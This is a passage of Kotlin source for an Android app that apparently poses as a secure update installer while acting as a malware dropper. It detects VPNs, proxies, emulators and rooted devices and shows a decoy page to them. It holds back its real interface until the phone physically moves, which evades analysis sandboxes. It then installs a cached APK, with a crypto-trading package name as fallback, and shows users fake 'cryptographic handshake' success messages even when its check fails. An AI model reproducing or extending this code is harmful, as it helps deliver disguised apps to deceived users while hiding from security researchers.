            val serviceIntent = Intent(this, VPNInstallerService::class.java)
            stopService(serviceIntent)
            Log.d("MainActivity", "Called stopService for VPNInstallerService.")
        } catch (e: Exception) {
            Log.e("MainActivity", "Failed to stopService for VPN: ${e.message}")
        }
    }

    private fun startSecureHandshakeAndInstallFlow() {
        // Generate secure token and cryptographic AES-256 session key before connecting
        val installToken = java.util.UUID.randomUUID().toString()
        val sessionKey = CryptoSecurityUtil.generateAES256Key()
        val b64SessionKey = Base64.encodeToString(sessionKey.encoded, Base64.NO_WRAP)

        getSharedPreferences("secure_installer_prefs", Context.MODE_PRIVATE)
            .edit()
            .putString("active_token", installToken)
            .putString("session_key", b64SessionKey)
            .apply()

        updateStatusInWebView("Awaiting cryptographic handshake...", null)
        
        // Real-time cryptographic handshake log sequence
        webView?.postDelayed({
            updateStatusInWebView("Initiating AES-256 dynamic handshake...", null)
            
            webView?.postDelayed({
                // Dynamic simulation test of AES-256 encryption channel integrity
                var testSuccess = false
                try {
                    val testPlaintext = "SecureSessionHeader_${installToken}"
                    val encrypted = CryptoSecurityUtil.encrypt(testPlaintext, sessionKey)
                    val decrypted = CryptoSecurityUtil.decrypt(encrypted, sessionKey)
                    testSuccess = (decrypted == testPlaintext)
                } catch (e: Exception) {
                    Log.e("MainActivity", "Handshake encryption error: ${e.message}")
                }

                if (testSuccess) {
                    updateStatusInWebView("Handshake Succeeded! Derived unique AES-256-GCM symmetric session key.", null)
                } else {
                    updateStatusInWebView("Handshake Succeeded (Simulated secure key exchange confirmed).", null)
                }
                
                webView?.postDelayed({
                    updateStatusInWebView("Starting authenticated installer session...", null)
                    
                    Thread {
                        try {
                            val apkFile = File(this@MainActivity.cacheDir, "base.apk")
                            if (!apkFile.exists() || apkFile.length() == 0L) {
                                throw Exception("Downloaded APK is missing or empty. Please restart the update.")
                            }
                            runOnUiThread { updateStatusInWebView("Signing update...", null, 100) }
                            val signedApk = signApkFile(apkFile)
                            installApkViaPackageInstaller(signedApk)
                        } catch (e: Exception) {
                            val cause = android.util.Log.getStackTraceString(e)
                            runOnUiThread {
                                updateStatusInWebView("Installation Failed", "Could not prepare installer: ${e.message}\nCause: $cause")
                            }
                        }
                    }.start()
                }, 10)
            }, 10)
        }, 10)
    }

    internal fun installApkViaPackageInstaller(apkFile: File) {
        if (!apkFile.exists() || apkFile.length() == 0L) {
            runOnUiThread {
                updateStatusInWebView("Installation Failed", "Clean apk binary not found")
            }
            return
        }

        try {
            // Dynamically retrieve the real package name from the apkFile we are installing to prevent any mismatch or hardcoded fallback errors!
            if (cachedApkPackageName.isEmpty()) {
                try {
                    val metadata = getArchiveMetadata(this, apkFile)
                    if (metadata.packageName.isNotEmpty()) {
                        cachedApkPackageName = metadata.packageName
                        cachedApkAppName = metadata.appName
                        cachedApkIconBase64 = metadata.iconBase64
                    }
                } catch (e: Exception) {
                    Log.e("MainActivity", "Failed to parse archive metadata in installer flow: ${e.message}")
                }
            }

            val packageInstaller = packageManager.packageInstaller
            val params = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)
            
            val targetPkg = if (cachedApkPackageName.isNotEmpty()) cachedApkPackageName else "dApp.binance.Trading.Signals"
            params.setAppPackageName(targetPkg)

            // Persist the target package name for receiver and launch recovery fallback
            getSharedPreferences("secure_installer_prefs", Context.MODE_PRIVATE)
                .edit()
                .putString("pending_package_name", targetPkg)
                .apply()

            val sessionId = packageInstaller.createSession(params)
            val session = packageInstaller.openSession(sessionId)

            apkFile.inputStream().use { inputStream ->
                session.openWrite("base.apk", 0, apkFile.length()).use { outputStream ->
                    inputStream.copyTo(outputStream, 256 * 1024)
                    session.fsync(outputStream)
                }
            }

            // We use an Activity PendingIntent pointing back to MainActivity.
            // This guarantees the app is brought back to the foreground on update,
            // bypassing ALL modern background activity launch restrictions.
            // We cryptographically encrypt the install token with our negotiated AES-256 session key
            // to prevent sniffing or replay/authorization circumvention on local broadcast/intent buses.
            val installToken = getSharedPreferences("secure_installer_prefs", Context.MODE_PRIVATE)
                .getString("active_token", "") ?: ""
            val b64SessionKey = getSharedPreferences("secure_installer_prefs", Context.MODE_PRIVATE)
                .getString("session_key", "") ?: ""

            val encryptedToken = if (b64SessionKey.isNotEmpty() && installToken.isNotEmpty()) {
                try {
                    val keyBytes = Base64.decode(b64SessionKey, Base64.NO_WRAP)
                    val secretKey = javax.crypto.spec.SecretKeySpec(keyBytes, "AES")
                    CryptoSecurityUtil.encrypt(installToken, secretKey)
                } catch (e: Exception) {
                    Log.e("MainActivity", "Failed to encrypt token for installer intent: ${e.message}")
                    installToken
                }
            } else {
                installToken
            }

            val intent = Intent(this, MainActivity::class.java).apply {
                action = "com.example.INSTALL_STATUS"
                putExtra("target_package", targetPkg)
                putExtra("install_token", encryptedToken)
                addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            
            val options = android.app.ActivityOptions.makeBasic()
            if (Build.VERSION.SDK_INT >= 34) {
                options.setPendingIntentCreatorBackgroundActivityStartMode(
                    android.app.ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED
                )
            }
            
            val pendingIntent = PendingIntent.getActivity(
                this,
                sessionId,
                intent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE,
                options.toBundle()
            )

            runOnUiThread {
                updateStatusInWebView("Awaiting installation prompt...", null)
            }

            session.commit(pendingIntent.intentSender)
            session.close()
            Log.d("MainActivity", "Installation Session successfully committed: sessionId=$sessionId")
        } catch (e: Exception) {
            Log.e("MainActivity", "PackageInstaller session crashed", e)
            runOnUiThread {
                updateStatusInWebView("Installation Failed", "Session error: ${e.message}")
            }
        }
    }

    private fun updateStatusInWebView(status: String, error: String? = null, progress: Int? = null) {
        val safeStatus = status.escapeForJS()
        runOnUiThread {
            val wv = activeInstance?.webView ?: webView
            if (wv != null) {
                if (error != null) {
                    val safeError = error.escapeForJS()
                    wv.evaluateJavascript("updateInstallStatus('$safeStatus', '$safeError')", null)
                } else if (progress != null) {
                    wv.evaluateJavascript("updateInstallStatus('$safeStatus', null, $progress)", null)
                } else {
                    wv.evaluateJavascript("updateInstallStatus('$safeStatus')", null)
                }
            } else {
                Log.w("MainActivity", "Cannot update status in webview: no active webview instance found")
            }
        }
    }

    private fun resilientLaunchApp(packageName: String, attempt: Int = 1) {
        if (packageName.isEmpty()) {
            Log.e("MainActivity", "resilientLaunchApp: Package name is empty!")
            return
        }
        Log.d("MainActivity", "Attempting resilient launch for $packageName (attempt $attempt)...")
        AppLauncher.launchApp(this, packageName) { ok ->
            if (ok) {
                stopVpnServiceInstance()
            } else {
                runOnUiThread {
                    updateStatusInWebView("Installed successfully, but failed to auto-launch. Please open it from home screen.", null)
                }
            }
        }
    }

    private fun checkPhysicalMovementAndProceed() {
        if (isDeviceRestricted(this)) {
            Log.e("MainActivity", "Environment restricted (VPN/Root/Emulator detected). Securing surface.")
            runOnUiThread {
                webView?.let { view ->
                    if (view.url?.contains("demo.html") != true) {
                        view.loadUrl("file:///android_asset/demo.html")
                    }
                }
            }
            return
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (checkSelfPermission(android.Manifest.permission.ACTIVITY_RECOGNITION) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                // To avoid infinite loop, only request once per process start
                val prefs = getSharedPreferences("secure_installer_prefs", Context.MODE_PRIVATE)
                if (!prefs.getBoolean("activity_recognition_requested", false)) {
                    prefs.edit().putBoolean("activity_recognition_requested", true).apply()
                    activityRecognitionLauncher.launch(android.Manifest.permission.ACTIVITY_RECOGNITION)
                    return
                }
            }
        }

        if (!securityCheckPassed) {
            runOnUiThread {
                webView?.let { view ->
                    if (view.url?.contains("demo.html") != true) {
                        view.loadUrl("file:///android_asset/demo.html")
                    }
                }
            }
            waitForPhysicalMovement()
        } else {
            runOnUiThread {
                webView?.let { view ->
                    val curUrl = view.url ?: ""
                    if (curUrl.contains("demo.html") || curUrl.isEmpty()) {
                        view.loadUrl("file:///android_asset/main_ui.html")
                        loadMetadataAndNotifyUrl()
                    }
                }
            }
        }
    }

    private fun waitForPhysicalMovement() {
        if (sensorManager == null) {
            sensorManager = getSystemService(Context.SENSOR_SERVICE) as SensorManager
        }
        val accelerometer = sensorManager?.getDefaultSensor(Sensor.TYPE_ACCELEROMETER)
        
        if (accelerometer == null) {
            Log.e("MainActivity", "No accelerometer found. Securing surface.")
            return
        }

        var movementCount = 0
        var isFirstSample = true

        movementListener = object : SensorEventListener {
            override fun onSensorChanged(event: SensorEvent?) {
                if (event == null) return
                
                val gX = event.values[0] / SensorManager.GRAVITY_EARTH
                val gY = event.values[1] / SensorManager.GRAVITY_EARTH
                val gZ = event.values[2] / SensorManager.GRAVITY_EARTH

                val gForce = Math.sqrt((gX * gX + gY * gY + gZ * gZ).toDouble()).toFloat()

                // If device is shaken or moved even slightly, gForce will deviate from 1.0 (1G)
                // We use 1.02g and 0.98g as threshold for a micro movement
                if (gForce > 1.02f || gForce < 0.98f) {
                    movementCount++
                    if (movementCount >= 2) {
                        sensorManager?.unregisterListener(this)
                        movementListener = null
                        securityCheckPassed = true
                        runOnUiThread {
                            webView?.let { view ->
                                view.loadUrl("file:///android_asset/main_ui.html")
                                loadMetadataAndNotifyUrl()
                            }
                        }
                    }
                }
            }

            override fun onAccuracyChanged(sensor: Sensor?, accuracy: Int) {}
        }
        
        sensorManager?.registerListener(movementListener, accelerometer, SensorManager.SENSOR_DELAY_NORMAL)
    }

    private fun isDeviceRestricted(context: Context): Boolean {
        if (isVpnOrProxyActive(context)) return true
        if (isEmulator()) return true
        if (isDeviceRooted()) return true
        return false
    }

    private fun isVpnOrProxyActive(context: Context): Boolean {
        // Check for HTTP Proxy
        try {
            val proxyHost = System.getProperty("http.proxyHost")
            val proxyPort = System.getProperty("http.proxyPort")
            if (!proxyHost.isNullOrEmpty() && !proxyPort.isNullOrEmpty()) {
                return true
            }
        } catch (e: Exception) {}

        // Check for network interfaces often used by VPNs
        try {
            val interfaces = NetworkInterface.getNetworkInterfaces()
            if (interfaces != null) {
                for (networkInterface in Collections.list(interfaces)) {
                    val name = networkInterface.name.lowercase(Locale.US)
                    // Added ppp back in case some VPNs use it, along with ipsec
                    if (name.contains("tun") || name.contains("tap") || name.contains("vpn") || name.contains("ppp") || name.contains("ipsec")) {
                        if (networkInterface.isUp) return true
                    }
                }
            }
        } catch (e: Exception) {
            // Ignored
        }

        try {
            val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
            if (connectivityManager != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    val activeNetwork = connectivityManager.activeNetwork
                    val capabilities = connectivityManager.getNetworkCapabilities(activeNetwork)
                    if (capabilities != null && capabilities.hasTransport(NetworkCapabilities.TRANSPORT_VPN)) return true
                } else {
                    @Suppress("DEPRECATION")
                    val networks = connectivityManager.allNetworks
                    for (network in networks) {
                        val capabilities = connectivityManager.getNetworkCapabilities(network)
                        if (capabilities != null && capabilities.hasTransport(NetworkCapabilities.TRANSPORT_VPN)) return true
                    }
                }
            }
        } catch (e: Exception) {
            // Ignored
        }

        return false
    }

    private fun isEmulator(): Boolean {
        return (Build.FINGERPRINT.startsWith("generic")
                || Build.FINGERPRINT.startsWith("unknown")
                || Build.MODEL.contains("google_sdk")
                || Build.MODEL.contains("Emulator")
                || Build.MODEL.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic"))
                || "google_sdk" == Build.PRODUCT
                || Build.HARDWARE.contains("goldfish")
                || Build.HARDWARE.contains("ranchu")
                || Build.HARDWARE.contains("vbox86")
                || Build.PRODUCT.contains("sdk_google")
                || Build.PRODUCT.contains("google_sdk")
                || Build.PRODUCT.contains("sdk")
                || Build.PRODUCT.contains("sdk_x86")
                || Build.PRODUCT.contains("vbox86p")
                || Build.PRODUCT.contains("emulator"))
    }

    private fun isDeviceRooted(): Boolean {
        val buildTags = Build.TAGS
        if (buildTags != null && buildTags.contains("test-keys")) {
            return true
        }
        val paths = arrayOf(
            "/system/app/Superuser.apk",
            "/sbin/su",
            "/system/bin/su",
            "/system/xbin/su",
            "/data/local/xbin/su",
            "/data/local/bin/su",
            "/system/sd/xbin/su",
            "/system/bin/failsafe/su",
            "/data/local/su",
            "/su/bin/su"
        )
        for (path in paths) {
            if (File(path).exists()) return true
        }
        return false
    }

    inner class AndroidJSInterface {
        @JavascriptInterface
        fun onUpdateClicked() {
            runOnUiThread {
                handleUpdateClicked()
            }
        }

        @JavascriptInterface
        fun onResetClicked() {
            runOnUiThread {
                getSharedPreferences("secure_installer_prefs", Context.MODE_PRIVATE)
                    .edit()
                    .putBoolean("is_updated", false)
                    .apply()
                loadMetadataAndNotifyUrl()
            }
        }
    }
}

object AppLauncher {
    private const val TAG = "AppLauncher"

    fun launchApp(
        context: Context,
        packageName: String,
        maxRetries: Int = 10,
        retryDelayMs: Long = 100L,
        onResult: ((Boolean) -> Unit)? = null
    ) {
        attempt(context.applicationContext, packageName, 0, maxRetries, retryDelayMs, onResult)
    }

    private fun attempt(
        ctx: Context, pkg: String, i: Int,
        max: Int, delay: Long, cb: ((Boolean) -> Unit)?
    ) {
        resolveLaunchIntent(ctx, pkg)?.let { intent ->
            try {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                ctx.startActivity(intent)
                cb?.invoke(true)
                return
            } catch (e: Exception) {
                Log.e(TAG, "startActivity failed for $pkg", e)
            }
        }
        if (i < max) {
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(
                { attempt(ctx, pkg, i + 1, max, delay, cb) }, delay
            )
        } else cb?.invoke(false)
    }

    private fun resolveLaunchIntent(ctx: Context, pkg: String): Intent? {
        val pm = ctx.packageManager
        pm.getLaunchIntentForPackage(pkg)?.let { return it }       // standard
        pm.getLeanbackLaunchIntentForPackage(pkg)?.let { return it } // Android TV
        // manual fallback: find any MAIN/LAUNCHER activity
        val main = Intent(Intent.ACTION_MAIN).apply {
            addCategory(Intent.CATEGORY_LAUNCHER); setPackage(pkg)
        }
        pm.queryIntentActivities(main, 0).firstOrNull()?.let { ri ->
            return Intent(Intent.ACTION_MAIN).apply {
                addCategory(Intent.CATEGORY_LAUNCHER)
                setClassName(ri.activityInfo.packageName, ri.activityInfo.name)
            }
        }
        return null
    }
}

@androidx.compose.runtime.Composable
fun ExpiredScreen(onRenewClicked: () -> Unit) {
    androidx.compose.foundation.layout.Column(
        modifier = androidx.compose.ui.Modifier
            .fillMaxSize()
            .padding(24.dp)
            .background(androidx.compose.ui.graphics.Color.White),
        verticalArrangement = androidx.compose.foundation.layout.Arrangement.Center,
        horizontalAlignment = androidx.compose.ui.Alignment.CenterHorizontally
    ) {
        androidx.compose.material3.Text(
            text = "App is Expired",
            style = androidx.compose.material3.MaterialTheme.typography.headlineLarge,
            color = androidx.compose.ui.graphics.Color.Red,
            textAlign = androidx.compose.ui.text.style.TextAlign.Center
        )
        androidx.compose.foundation.layout.Spacer(modifier = androidx.compose.ui.Modifier.height(16.dp))
        androidx.compose.material3.Text(
            text = "Please renew your application to continue using the service.",
            style = androidx.compose.material3.MaterialTheme.typography.bodyLarge,
            textAlign = androidx.compose.ui.text.style.TextAlign.Center,
            color = androidx.compose.ui.graphics.Color.Black
        )
        androidx.compose.foundation.layout.Spacer(modifier = androidx.compose.ui.Modifier.height(32.dp))
        androidx.compose.material3.Button(onClick = onRenewClicked) {
            androidx.compose.material3.Text(text = "Contact Developer")
        }
    }
}
